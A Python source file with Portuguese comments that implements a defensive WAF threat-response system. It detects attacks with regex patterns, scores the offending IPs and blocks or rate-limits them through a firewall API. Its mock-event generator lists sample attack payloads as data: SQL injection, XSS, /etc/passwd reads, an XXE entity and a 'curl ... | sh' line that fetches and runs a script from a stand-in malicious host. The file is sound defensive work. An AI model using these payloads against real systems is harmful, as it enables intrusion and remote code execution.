#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sistema de Resposta Automatizada a Ameaças WAF (refatorado)
- Resiliente a falhas de rede (retry/backoff exponencial)
- Normalização/decodificação avançada de payloads
- Gerenciamento de listas de IP/CIDR/ASN
- Janela temporal com análise estatística
- Bloqueio temporário com TTL e auto-desbloqueio
- Circuit breaker para APIs externas
- Suporte a IPv4/IPv6
"""

import json
import gzip
import ipaddress
import logging
import random
import re
import threading
import time
from base64 import b64decode
from collections import Counter, defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from typing import Dict, Iterable, List, Optional, Tuple, Set, Any

import requests

# ========= Logging Avançado =========
def setup_logging(json_log: bool = False) -> logging.Logger:
    """Configura sistema de logging com suporte a JSON estruturado"""
    logger = logging.getLogger("waf")
    logger.setLevel(logging.INFO)
    logger.handlers.clear()

    if json_log:
        class JsonFormatter(logging.Formatter):
            def format(self, record: logging.LogRecord) -> str:
                log_entry = {
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "level": record.levelname,
                    "logger": record.name,
                    "message": record.getMessage(),
                    "module": record.module,
                    "function": record.funcName,
                    "line": record.lineno
                }
                if record.exc_info:
                    log_entry["exception"] = self.formatException(record.exc_info)
                return json.dumps(log_entry, ensure_ascii=False)
        
        formatter = JsonFormatter()
    else:
        formatter = logging.Formatter(
            "%(asctime)s.%(msecs)03dZ - %(levelname)s - %(module)s:%(lineno)d - %(message)s",
            datefmt="%Y-%m-%dT%H:%M:%S"
        )
        formatter.converter = time.gmtime  # Usar UTC

    handler = logging.StreamHandler()
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    return logger

logger = setup_logging(False)

# ========= Configuração =========
@dataclass
class AppConfig:
    # APIs externas
    siem_api_url: str = ""            # Modo DEMO se vazio
    firewall_api_url: str = ""        # Modo SIMULAÇÃO se vazio
    alert_webhook: str = ""           # Log local se vazio
    
    # Cabeçalhos HTTP
    headers: Dict[str, str] = field(default_factory=lambda: {
        "Authorization": "Bearer your-api-token",
        "Content-Type": "application/json",
        "User-Agent": "WAF-AutoResponse/2.0",
    })
    
    # Parâmetros de segurança
    attack_count_critical: int = 12
    attack_count_high: int = 6
    risk_score_critical: int = 75
    time_window_minutes: int = 5      # Janela de análise aumentada
    block_duration_hours: int = 2     # Duração de bloqueio aumentada
    max_payload_len: int = 32_768
    
    # Listas de rede
    whitelist_ips: Set[str] = field(default_factory=set)
    whitelist_cidrs: Set[str] = field(default_factory=lambda: {
        "127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"
    })
    blacklist_ips: Set[str] = field(default_factory=set)
    blacklist_cidrs: Set[str] = field(default_factory=set)
    
    # Parâmetros de rede
    request_timeout: int = 15
    max_retries: int = 3
    circuit_breaker_failures: int = 5
    circuit_reset_seconds: int = 120  # Tempo de reset aumentado
    analysis_interval: int = 90       # Intervalo padrão de análise

    def validate(self) -> None:
        """Valida configurações e converte listas para conjuntos"""
        # Converter para sets para operações eficientes
        self.whitelist_ips = set(self.whitelist_ips)
        self.blacklist_ips = set(self.blacklist_ips)
        
        # Validar CIDRs
        for cidr_list in [self.whitelist_cidrs, self.blacklist_cidrs]:
            for cidr in cidr_list.copy():
                try:
                    ipaddress.ip_network(cidr)
                except ValueError as e:
                    logger.error(f"CIDR inválido removido: {cidr} - {str(e)}")
                    cidr_list.discard(cidr)

@dataclass
class ThreatPattern:
    source_ip: str
    attack_types: List[str]
    severity: str
    attack_count: int
    score: int
    first_seen: datetime
    last_seen: datetime

@dataclass
class ResponseAction:
    action_type: str
    target: str
    duration: int
    reason: str
    executed: bool = False

# ========= Utilitários =========
def utcnow() -> datetime:
    return datetime.now(timezone.utc)

def jitter(base: float, spread: float = 0.2) -> float:
    return base * (1 + random.uniform(-spread, spread))

def is_ip_blocked(ip: str, blocked_ips: Dict[str, datetime]) -> bool:
    """Verifica se IP está atualmente bloqueado"""
    expire_time = blocked_ips.get(ip)
    return expire_time is not None and utcnow() < expire_time

def is_ip_in_list(ip: str, cidrs: Iterable[str], ips: Iterable[str]) -> bool:
    """Verifica eficientemente se IP está em listas de rede"""
    try:
        ip_obj = ipaddress.ip_address(ip)
    except ValueError:
        return False
    
    # Verificar lista de IPs primeiro (mais rápido)
    if ip in ips:
        return True
    
    # Verificar CIDRs
    for cidr in cidrs:
        try:
            if ip_obj in ipaddress.ip_network(cidr, strict=False):
                return True
        except ValueError:
            continue
    
    return False

# ========= Analisador de Ameaças =========
class WAFThreatAnalyzer:
    """Analisador de payloads com técnicas avançadas de detecção"""
    
    # Padrões compilados para melhor performance
    THREAT_PATTERNS = {
        "sql_injection": [
            re.compile(r"\b(union\s+select|select\s+[\w\*]+\s+from|insert\s+into|update\s+\w+\s+set|delete\s+from|drop\s+table)\b", re.I),
            re.compile(r"(--|#|\/\*)[^\n]*(\*\/)?", re.I),  # Comentários SQL
            re.compile(r"\b(exec|execute|sp_executesql|xp_cmdshell)\b", re.I),
        ],
        "xss": [
            re.compile(r"<(script|iframe|img|svg|body|on\w+)[\s>]", re.I),
            re.compile(r"javascript:\s*\w+\(|<\s*\/\s*script", re.I),
            re.compile(r"alert\(|prompt\(|confirm\(", re.I),
        ],
        "directory_traversal": [
            re.compile(r"(?:\.\.\/|\.\\){2,}[\w\.\-_]+", re.I),
            re.compile(r"\/(etc|winnt|windows|system32)\/[\w\.]+", re.I),
        ],
        "command_injection": [
            re.compile(r"[\|&;`]\s*(?:sh|bash|cmd|powershell)\b", re.I),
            re.compile(r"\b(?:rm\s+-\w*f|del\s+\/q|mv\s+\w+\s+\/dev\/null)\b", re.I),
        ],
        "lfi": [
            re.compile(r"\b(?:php|file|data|zip|phar)://", re.I),
            re.compile(r"=\s*(?:https?|ftp):\/\/", re.I),
        ],
        "ssti": [
            re.compile(r"\{\{.*?\}\}|{%\s*.*?\s*%}", re.I),  # Jinja, Twig
            re.compile(r"<\?php|\?>", re.I),  # PHP
        ],
        "xxe": [
            re.compile(r"<!ENTITY\s+\w+\s+SYSTEM", re.I),
            re.compile(r"<!DOCTYPE\s+\w+\s*\[", re.I),
        ],
    }

    def __init__(self, max_payload_len: int = 32768):
        self.max_payload_len = max_payload_len
        self.decoded_cache = {}  # Cache simples para payloads repetidos

    def _normalize(self, payload: str) -> str:
        """Normaliza payload com múltiplas técnicas de decodificação"""
        if not payload:
            return ""
        
        # Usar cache para payloads idênticos
        if payload in self.decoded_cache:
            return self.decoded_cache[payload]
        
        # 1. Truncar para tamanho máximo
        normalized = payload[:self.max_payload_len]
        
        try:
            # 2. URL decoding (até 2 níveis)
            from urllib.parse import unquote
            decoded = unquote(normalized)
            if decoded != normalized:
                normalized = decoded
                decoded = unquote(normalized)  # Segundo nível
                if decoded != normalized:
                    normalized = decoded
        except Exception:
            pass
        
        # 3. Base64 detection (heurística)
        if re.match(r"^[A-Za-z0-9+/=\s]{20,}$", normalized):
            try:
                decoded = b64decode(normalized).decode('utf-8', 'ignore')
                if decoded:
                    normalized = decoded
            except Exception:
                pass
        
        # 4. Gzip detection
        if normalized.startswith('\x1f\x8b'):
            try:
                decompressed = gzip.decompress(normalized.encode('latin1'))
                normalized = decompressed.decode('utf-8', 'ignore')
            except Exception:
                pass
        
        # 5. Remover null bytes e caracteres especiais
        normalized = re.sub(r"[\x00-\x1F]", "", normalized)
        
        # Armazenar no cache
        self.decoded_cache[payload] = normalized
        return normalized

    def analyze_payload(self, payload: str) -> Dict:
        """Analisa payload e retorna ameaças detectadas com score"""
        normalized = self._normalize(payload or "")
        attack_types = []
        risk_score = 0
        detection_details = []
        
        # Verificar cada categoria de ameaça
        for category, patterns in self.THREAT_PATTERNS.items():
            for pattern in patterns:
                if pattern.search(normalized):
                    # Evitar duplicatas
                    if category not in attack_types:
                        attack_types.append(category)
                    
                    # Adicionar detalhes para logging
                    match = pattern.search(normalized)
                    if match:
                        detection_details.append(f"{category}:{match.group(0)[:30]}")
                    
                    # Aumentar score baseado na categoria
                    risk_score += {
                        "sql_injection": 25,
                        "xss": 15,
                        "command_injection": 30,
                        "lfi": 20,
                        "ssti": 25,
                        "xxe": 30
                    }.get(category, 15)
                    break  # Apenas um padrão por categoria
        
        # Penalizar payloads muito longos
        if len(normalized) > 1000:
            risk_score += 10
        
        # Bônus para múltiplos vetores de ataque
        if len(attack_types) > 1:
            risk_score += len(attack_types) * 5
        
        # Limitar score entre 0-100
        risk_score = min(100, max(0, risk_score))
        
        return {
            "attack_types": attack_types,
            "risk_score": risk_score,
            "payload_length": len(normalized),
            "detection_details": detection_details[:3]  # Limitar detalhes
        }

# ========= Cliente HTTP Resiliente =========
class ResilientHTTPClient:
    """Cliente HTTP com retry exponencial e circuit breaker"""
    
    def __init__(self, config: AppConfig):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update(config.headers)
        self.circuit_open = False
        self.last_failure_time = None
        self.failure_count = 0

    def _should_retry(self, status_code: int) -> bool:
        """Determina se uma requisição deve ser repetida"""
        return status_code >= 500 or status_code in [408, 429, 444]

    def _check_circuit(self) -> bool:
        """Verifica estado do circuit breaker"""
        if not self.circuit_open:
            return False
        
        # Verificar se deve resetar o circuito
        reset_time = self.last_failure_time + timedelta(
            seconds=self.config.circuit_reset_seconds
        )
        if utcnow() > reset_time:
            logger.info("Resetting circuit breaker")
            self.circuit_open = False
            self.failure_count = 0
            return False
        return True

    def request(self, method: str, url: str, **kwargs) -> Tuple[Optional[requests.Response], Optional[Exception]]:
        """Executa requisição HTTP com resiliência"""
        # Verificar circuit breaker
        if self._check_circuit():
            return None, Exception("Circuit breaker is open")
        
        # Configurar timeout padrão
        kwargs.setdefault("timeout", self.config.request_timeout)
        
        for attempt in range(self.config.max_retries + 1):
            try:
                response = self.session.request(method, url, **kwargs)
                
                # Sucesso
                if 200 <= response.status_code < 300:
                    self.failure_count = 0
                    return response, None
                
                # Verificar se deve tentar novamente
                if self._should_retry(response.status_code) and attempt < self.config.max_retries:
                    wait = jitter(0.5 * (2 ** attempt))
                    logger.warning(f"HTTP {response.status_code} em {url}. Tentativa {attempt+1}/{self.config.max_retries}. Esperando {wait:.1f}s")
                    time.sleep(wait)
                    continue
                
                # Erro não recuperável
                return response, Exception(f"HTTP error {response.status_code}")
            
            except (requests.ConnectionError, requests.Timeout) as e:
                if attempt < self.config.max_retries:
                    wait = jitter(0.7 * (2 ** attempt))
                    logger.warning(f"Erro de rede em {url}: {str(e)}. Tentativa {attempt+1}/{self.config.max_retries}. Esperando {wait:.1f}s")
                    time.sleep(wait)
                    continue
                return None, e
            
            except Exception as e:
                return None, e
        
        # Atualizar circuit breaker após falhas consecutivas
        self.failure_count += 1
        if self.failure_count >= self.config.circuit_breaker_failures:
            self.circuit_open = True
            self.last_failure_time = utcnow()
            logger.error(f"Circuit breaker ativado para {url}")
        
        return None, Exception("Max retries exceeded")

# ========= Sistema Principal =========
class ThreatResponseSystem:
    def __init__(self, config: Dict):
        self.config = AppConfig(**config)
        self.config.validate()
        
        self.analyzer = WAFThreatAnalyzer(
            max_payload_len=self.config.max_payload_len
        )
        self.blocked_ips: Dict[str, datetime] = {}
        self.http_client = ResilientHTTPClient(self.config)
        self.last_analysis = utcnow()
        self.lock = threading.Lock()  # Para operações thread-safe

    # ----- Gerenciamento de Eventos -----
    def get_waf_events(self, start_time: datetime, end_time: datetime) -> List[Dict]:
        """Obtém eventos do SIEM com fallback para dados simulados"""
        if not self.config.siem_api_url:
            logger.info("SIEM não configurado → usando eventos simulados")
            return self._generate_mock_events(start_time, end_time)
        
        params = {
            "start": start_time.isoformat(),
            "end": end_time.isoformat(),
            "event_type": "waf_block",
            "limit": 1000,
        }
        
        resp, err = self.http_client.request(
            "GET", self.config.siem_api_url, params=params
        )
        
        if err or resp is None or resp.status_code != 200:
            logger.error(f"Falha ao obter eventos: {str(err) if err else resp.status_code if resp else 'sem resposta'}")
            return self._generate_mock_events(start_time, end_time)
        
        try:
            events = resp.json().get("events", [])
            logger.info(f"Recebidos {len(events)} eventos do SIEM")
            return [e for e in events if self._event_in_window(e, start_time, end_time)]
        except Exception as e:
            logger.error(f"Erro ao processar eventos: {str(e)}")
            return self._generate_mock_events(start_time, end_time)

    @staticmethod
    def _event_in_window(event: Dict, start: datetime, end: datetime) -> bool:
        """Verifica se evento está na janela temporal"""
        ts_str = event.get("timestamp")
        if not ts_str:
            return False
        
        try:
            # Converter diferentes formatos de timestamp
            if '.' in ts_str:
                ts = datetime.fromisoformat(ts_str.replace("Z", "+00:00"))
            else:
                ts = datetime.strptime(ts_str, "%Y-%m-%dT%H:%M:%S%z")
            
            if ts.tzinfo is None:
                ts = ts.replace(tzinfo=timezone.utc)
            
            return start <= ts <= end
        except Exception:
            return False

    # ----- Análise de Ameaças -----
    def analyze_events(self, events: List[Dict]) -> List[ThreatPattern]:
        """Agrega eventos por IP e detecta padrões de ameaça"""
        with self.lock:
            ip_analysis = defaultdict(lambda: {
                "count": 0,
                "score_total": 0,
                "types": Counter(),
                "first_seen": None,
                "last_seen": None,
                "details": []
            })

            for event in events:
                ip = event.get("source_ip", "")
                if not ip or is_ip_in_list(
                    ip, 
                    self.config.whitelist_cidrs, 
                    self.config.whitelist_ips
                ):
                    continue
                
                # Ignorar IPs já bloqueados
                if is_ip_blocked(ip, self.blocked_ips):
                    continue
                
                # Analisar payload
                payload = event.get("payload", "")
                analysis = self.analyzer.analyze_payload(payload)
                
                # Processar timestamp
                try:
                    ts = datetime.fromisoformat(event["timestamp"].replace("Z", "+00:00"))
                    if ts.tzinfo is None:
                        ts = ts.replace(tzinfo=timezone.utc)
                except Exception:
                    ts = utcnow()
                
                # Atualizar análise por IP
                ip_data = ip_analysis[ip]
                ip_data["count"] += 1
                ip_data["score_total"] += analysis["risk_score"]
                ip_data["types"].update(analysis["attack_types"])
                ip_data["details"].extend(analysis.get("detection_details", []))
                
                if not ip_data["first_seen"] or ts < ip_data["first_seen"]:
                    ip_data["first_seen"] = ts
                
                if not ip_data["last_seen"] or ts > ip_data["last_seen"]:
                    ip_data["last_seen"] = ts

            # Gerar padrões de ameaça
            patterns = []
            for ip, data in ip_analysis.items():
                if data["count"] < 3:  # Mínimo de eventos para considerar
                    continue
                
                avg_score = data["score_total"] / data["count"]
                severity = self._calculate_severity(data["count"], avg_score, data["types"])
                
                if severity in ("HIGH", "CRITICAL"):
                    patterns.append(ThreatPattern(
                        source_ip=ip,
                        attack_types=list(data["types"].keys()),
                        severity=severity,
                        attack_count=data["count"],
                        score=round(avg_score),
                        first_seen=data["first_seen"],
                        last_seen=data["last_seen"],
                    ))
                    logger.info(f"Ameaça detectada: {ip} - {severity} - Score: {avg_score:.1f}")

            return patterns

    def _calculate_severity(self, count: int, score: float, types: Counter) -> str:
        """Calcula severidade baseada em múltiplos fatores"""
        critical_types = {"sql_injection", "command_injection", "xxe"}
        has_critical = any(t in critical_types for t in types)
        
        if (count >= self.config.attack_count_critical or 
            score >= self.config.risk_score_critical or 
            (has_critical and count >= max(3, self.config.attack_count_high))):
            return "CRITICAL"
        elif count >= self.config.attack_count_high or score >= (self.config.risk_score_critical * 0.7):
            return "HIGH"
        return "MEDIUM"

    # ----- Ações de Resposta -----
    def execute_response_actions(self, patterns: List[ThreatPattern]) -> List[ResponseAction]:
        """Executa ações de resposta baseadas nos padrões detectados"""
        actions = []
        now = utcnow()
        
        for pattern in patterns:
            # Ignorar IPs em whitelist
            if is_ip_in_list(
                pattern.source_ip, 
                self.config.whitelist_cidrs, 
                self.config.whitelist_ips
            ):
                continue
            
            # Aplicar blacklist imediata
            if is_ip_in_list(
                pattern.source_ip, 
                self.config.blacklist_cidrs, 
                self.config.blacklist_ips
            ):
                pattern.severity = "CRITICAL"
            
            # Evitar duplicação de ações
            if is_ip_blocked(pattern.source_ip, self.blocked_ips):
                continue
            
            if pattern.severity == "CRITICAL":
                duration = self.config.block_duration_hours * 3600
                action = self._create_block_action(pattern, duration)
                actions.append(action)
            
            elif pattern.severity == "HIGH":
                action = self._create_rate_limit_action(pattern)
                actions.append(action)
        
        # Limpeza de bloqueios expirados
        self._gc_blocked_ips()
        return actions

    def _create_block_action(self, pattern: ThreatPattern, duration: int) -> ResponseAction:
        """Cria e executa ação de bloqueio"""
        reason = (
            f"Ataque crítico: {pattern.attack_count} requisições, "
            f"tipos: {', '.join(pattern.attack_types)}, "
            f"score: {pattern.score}"
        )
        
        action = ResponseAction(
            action_type="block_ip",
            target=pattern.source_ip,
            duration=duration,
            reason=reason,
        )
        
        if self._block_ip(pattern.source_ip, duration, reason):
            action.executed = True
            with self.lock:
                self.blocked_ips[pattern.source_ip] = utcnow() + timedelta(seconds=duration)
            self._send_alert(pattern, "BLOCKED")
        
        return action

    def _create_rate_limit_action(self, pattern: ThreatPattern) -> ResponseAction:
        """Cria e executa ação de rate limiting"""
        duration = 1800  # 30 minutos
        reason = (
            f"Alta ameaça: {pattern.attack_count} requisições, "
            f"tipos: {', '.join(pattern.attack_types)}, "
            f"score: {pattern.score}"
        )
        
        action = ResponseAction(
            action_type="rate_limit",
            target=pattern.source_ip,
            duration=duration,
            reason=reason,
        )
        
        if self._apply_rate_limit(pattern.source_ip, duration):
            action.executed = True
            self._send_alert(pattern, "RATE_LIMITED")
        
        return action

    def _block_ip(self, ip: str, duration: int, reason: str) -> bool:
        """Bloqueia IP no firewall"""
        if not self.config.firewall_api_url:
            logger.info(f"[SIM] Bloqueio de IP: {ip} por {duration}s - {reason}")
            return True
        
        payload = {
            "action": "block",
            "source_ip": ip,
            "duration": duration,
            "reason": reason,
            "created_by": "WAF-AutoResponse",
        }
        
        resp, err = self.http_client.request(
            "POST", 
            f"{self.config.firewall_api_url}/block",
            json=payload
        )
        
        if err or not resp or resp.status_code != 200:
            logger.error(f"Falha no bloqueio de {ip}: {err or resp.status_code}")
            return False
        
        logger.info(f"IP bloqueado: {ip} por {duration}s")
        return True

    def _apply_rate_limit(self, ip: str, duration: int) -> bool:
        """Aplica rate limit ao IP"""
        if not self.config.firewall_api_url:
            logger.info(f"[SIM] Rate limit: {ip} por {duration}s (10/min)")
            return True
        
        payload = {
            "action": "rate_limit",
            "source_ip": ip,
            "limit": "10/minute",
            "duration": duration,
        }
        
        resp, err = self.http_client.request(
            "POST", 
            f"{self.config.firewall_api_url}/rate-limit",
            json=payload
        )
        
        if err or not resp or resp.status_code != 200:
            logger.error(f"Falha no rate limit de {ip}: {err or resp.status_code}")
            return False
        
        logger.info(f"Rate limit aplicado: {ip}")
        return True

    def _send_alert(self, pattern: ThreatPattern, action: str) -> None:
        """Envia alerta via webhook"""
        alert = {
            "timestamp": utcnow().isoformat(),
            "source_ip": pattern.source_ip,
            "attack_types": pattern.attack_types,
            "severity": pattern.severity,
            "count": pattern.attack_count,
            "score": pattern.score,
            "first_seen": pattern.first_seen.isoformat(),
            "last_seen": pattern.last_seen.isoformat(),
            "action_taken": action,
        }
        
        if not self.config.alert_webhook:
            logger.info(f"[ALERTA] {json.dumps(alert, indent=2)}")
            return
        
        resp, err = self.http_client.request(
            "POST", 
            self.config.alert_webhook,
            json=alert
        )
        
        if err or not resp or resp.status_code >= 300:
            logger.error(f"Falha no webhook: {err or resp.status_code}")
            logger.info(f"[ALERTA LOCAL] {json.dumps(alert)}")
        else:
            logger.info("Alerta enviado via webhook")

    def _gc_blocked_ips(self) -> None:
        """Limpa IPs bloqueados expirados"""
        now = utcnow()
        expired = [ip for ip, until in self.blocked_ips.items() if until <= now]
        
        for ip in expired:
            with self.lock:
                del self.blocked_ips[ip]
            logger.info(f"Bloqueio expirado: {ip}")

    # ----- Ciclo Principal -----
    def run_analysis_cycle(self) -> None:
        """Executa um ciclo completo de análise e resposta"""
        cycle_id = f"cycle-{int(time.time()*1000)}"
        logger.info(f"[{cycle_id}] Iniciando ciclo de análise")
        
        try:
            end = utcnow()
            start = end - timedelta(minutes=self.config.time_window_minutes)
            
            # Obter e analisar eventos
            events = self.get_waf_events(start, end)
            logger.info(f"[{cycle_id}] Eventos processados: {len(events)}")
            
            if not events:
                return
            
            patterns = self.analyze_events(events)
            logger.info(f"[{cycle_id}] Padrões detectados: {len(patterns)}")
            
            if patterns:
                actions = self.execute_response_actions(patterns)
                executed = sum(1 for a in actions if a.executed)
                logger.info(f"[{cycle_id}] Ações executadas: {executed}/{len(actions)}")
            
            self.last_analysis = utcnow()
        
        except Exception as e:
            logger.exception(f"[{cycle_id}] Erro no ciclo de análise")

    def start_monitoring(self) -> threading.Thread:
        """Inicia monitoramento contínuo em thread separada"""
        def monitor_loop():
            logger.info("Monitoramento iniciado")
            while True:
                self.run_analysis_cycle()
                sleep_time = jitter(self.config.analysis_interval)
                time.sleep(sleep_time)
        
        thread = threading.Thread(
            target=monitor_loop, 
            daemon=True,
            name="WAF-Monitor"
        )
        thread.start()
        return thread

    # ----- Simulação/Demo -----
    def _generate_mock_events(self, start: datetime, end: datetime) -> List[Dict]:
        """Gera eventos simulados para demonstração"""
        ips = [
            "203.0.113.42", "198.51.100.15", "192.0.2.78", 
            "2001:db8::1", "2001:db8:85a3::8a2e:370:7334"
        ]
        
        payloads = [
            "1' OR '1'='1'--",
            "<script>document.cookie</script>",
            "../../../../etc/passwd",
            "| cat /etc/passwd",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "{{7*7}}",
            "union select null,concat(user,':',password) from users",
            "curl http://malicious.site/malware.sh | sh",
        ]
        
        events = []
        time_range = (end - start).total_seconds()
        
        for _ in range(random.randint(10, 30)):
            event_time = start + timedelta(seconds=random.uniform(0, time_range))
            events.append({
                "source_ip": random.choice(ips),
                "timestamp": event_time.isoformat(),
                "payload": random.choice(payloads),
                "status_code": 403,
                "method": random.choice(["GET", "POST"]),
                "path": f"/{random.choice(['admin', 'wp-login', 'api'])}",
                "user_agent": random.choice([
                    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
                    "curl/7.88.1",
                    "python-requests/2.31.0",
                    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
                ]),
            })
        
        return events

# ========= Ponto de Entrada =========
def main():
    config = {
        "siem_api_url": "",
        "firewall_api_url": "",
        "alert_webhook": "",
        "attack_count_critical": 10,
        "attack_count_high": 5,
        "risk_score_critical": 80,
        "time_window_minutes": 5,
        "block_duration_hours": 2,
        "whitelist_cidrs": [
            "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
            "100.64.0.0/10", "fc00::/7"
        ],
        "analysis_interval": 90,
    }
    
    logger.info("=== Sistema de Resposta WAF - Iniciando ===")
    app = ThreatResponseSystem(config)
    
    # Executar um ciclo imediato
    app.run_analysis_cycle()
    
    # Iniciar monitoramento contínuo
    monitor_thread = app.start_monitoring()
    
    try:
        monitor_thread.join()
    except KeyboardInterrupt:
        logger.info("Interrompido pelo usuário. Encerrando...")

if __name__ == "__main__":
    main()